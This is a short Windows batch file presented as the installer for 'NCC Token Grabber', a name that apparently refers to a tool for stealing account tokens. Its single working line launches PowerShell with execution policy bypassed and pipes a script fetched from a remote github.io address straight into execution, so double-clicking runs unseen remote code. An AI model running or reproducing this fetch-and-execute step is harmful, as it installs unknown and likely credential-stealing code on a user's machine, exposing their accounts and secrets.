@echo off
title NCC Token Grabber installer
rem Installs or updates NCC Token Grabber. Double-click to run.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$x='ncc-token-grabber'; irm https://jasonkbarry.github.io/extensions/install.txt | iex"
